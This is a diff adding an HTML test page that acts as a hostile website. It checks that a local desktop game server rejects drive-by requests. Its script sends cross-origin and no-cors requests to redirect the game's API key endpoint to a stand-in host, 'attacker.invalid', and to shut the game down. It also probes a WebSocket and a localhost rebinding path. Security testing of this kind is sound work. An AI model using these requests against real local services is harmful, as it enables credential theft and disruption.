@@ -1,0 +1,125 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Drive-by check</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!--
+  A hostile web page, for testing. Open it in Edge (or any browser) while the
+  desktop game is running and pass the game's port: drive_by.html?port=5091
+  (play.py prints it; logs/launch.json has it).
+
+  Every attack below is one a real page could make against the local server
+  before local_guard.py (docs/plans/DISTRIBUTION_MVP_PLAN.md, M1). Most of them
+  are "simple" requests a browser sends without asking, so the page cannot see
+  the answer — the verdict is the SERVER'S: each line in logs/play_actual.err.log
+  (or somewhere.log) for these paths must say 403, and ACCOUNT must still show
+  the key you had. A line this page marks READ means it could read the game's
+  answer, which must never happen.
+-->
+<style>
+  :root { --bg:#0c0f0e; --fg:#d7e3dc; --dim:#7d8c84; --bad:#ff6b6b; --ok:#7fe0a6; }
+  body { background:var(--bg); color:var(--fg); font:15px/1.5 system-ui, sans-serif; margin:0; padding:24px 16px; }
+  main { max-width:760px; margin:0 auto; }
+  h1 { font-size:20px; margin:0 0 4px; }
+  p { color:var(--dim); margin:0 0 16px; }
+  li { margin:6px 0; font-family:ui-monospace, Consolas, monospace; font-size:13px; overflow-wrap:anywhere; }
+  .bad { color:var(--bad); } .ok { color:var(--ok); }
+  input, button { font:inherit; padding:6px 10px; }
+</style>
+<main>
+  <h1>Drive-by check</h1>
+  <p>A page on another site, trying to reach the game running on this machine.</p>
+  <form id="f"><label>Port <input id="port" size="6" inputmode="numeric"></label>
+    <button>Attack</button></form>
+  <ul id="out"></ul>
+</main>
+<script>
+const out = document.getElementById("out");
+const portIn = document.getElementById("port");
+portIn.value = new URLSearchParams(location.search).get("port") || "";
+
+function say(text, cls) {
+  const li = document.createElement("li");
+  li.textContent = text;
+  if (cls) li.className = cls;
+  out.appendChild(li);
+}
+
+async function attempt(label, fn) {
+  try {
+    const r = await fn();
+    if (r === "opaque") say(label + " — sent blind (check the server log: must be 403)");
+    else if (r && r.readable) say(label + " — READ the game's answer: " + r.status, r.status === 403 ? "ok" : "bad");
+    else say(label + " — " + (r || "done"));
+  } catch (e) {
+    say(label + " — blocked by the browser (" + (e && e.message || e) + ")", "ok");
+  }
+}
+
+async function attack(port) {
+  out.textContent = "";
+  const base = "http://127.0.0.1:" + port;
+  const rebind = "http://localhost:" + port;
+
+  // 1. Read the port's health (the old way to find the game).
+  await attempt("GET /api/health (cors)", async () => {
+    const r = await fetch(base + "/api/health");
+    return { readable: true, status: r.status };
+  });
+  // 2. Redirect the narrator, keeping the player's stored key (the M1 exploit).
+  await attempt("PUT /api/keys/custom (cors, json)", async () => {
+    const r = await fetch(base + "/api/keys/custom", {
+      method: "PUT", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ address: "https://attacker.invalid/v1", model: "m", value: "" }) });
+    return { readable: true, status: r.status };
+  });
+  // 3. The same as a "simple" request, which needs no preflight.
+  await attempt("PUT-as-POST text/plain (no-cors)", async () => {
+    await fetch(base + "/api/keys/custom", { method: "POST", mode: "no-cors",
+      headers: { "Content-Type": "text/plain" },
+      body: JSON.stringify({ address: "https://attacker.invalid/v1", model: "m", value: "" }) });
+    return "opaque";
+  });
+  // 4. Quit the game from a web page.
+  await attempt("POST /api/shutdown (no-cors)", async () => {
+    await fetch(base + "/api/shutdown", { method: "POST", mode: "no-cors" });
+    return "opaque";
+  });
+  // 5. A classic form post (top-level navigation carries SameSite=Lax cookies; ours is Strict).
+  await attempt("form POST /api/shutdown", async () => {
+    const f = document.createElement("form");
+    f.method = "POST"; f.action = base + "/api/shutdown"; f.target = "sink";
+    const sink = document.createElement("iframe"); sink.name = "sink"; sink.hidden = true;
+    document.body.append(sink, f); f.submit();
+    return "opaque";
+  });
+  // 6. Load a frame of the run as an image.
+  await attempt("<img> /api/health", () => new Promise((res) => {
+    const i = new Image();
+    i.onload = () => res("loaded — the server answered 200 to a stranger");
+    i.onerror = () => res("refused or not an image (check the log)");
+    i.src = base + "/api/health?t=" + Date.now();
+  }));
+  // 7. The live TALK socket.
+  await attempt("WebSocket /ws/talk/live", () => new Promise((res) => {
+    let ws;
+    try { ws = new WebSocket("ws://127.0.0.1:" + port + "/ws/talk/live"); }
+    catch (e) { return res("blocked by the browser"); }
+    ws.onopen = () => { ws.close(); res("OPENED — the socket answered a stranger"); };
+    ws.onerror = () => res("refused");
+    setTimeout(() => res("no answer"), 3000);
+  }));
+  // 8. The same host under its other name (what a rebinding attack arrives as).
+  await attempt("GET localhost /api/health (cors)", async () => {
+    const r = await fetch(rebind + "/api/health");
+    return { readable: true, status: r.status };
+  });
+  say("Done. Now read the server log: every request above must be 403.");
+}
+
+document.getElementById("f").addEventListener("submit", (e) => {
+  e.preventDefault();
+  const p = parseInt(portIn.value, 10);
+  if (p > 0 && p < 65536) attack(p);
+});
+if (portIn.value) attack(parseInt(portIn.value, 10));
+</script>
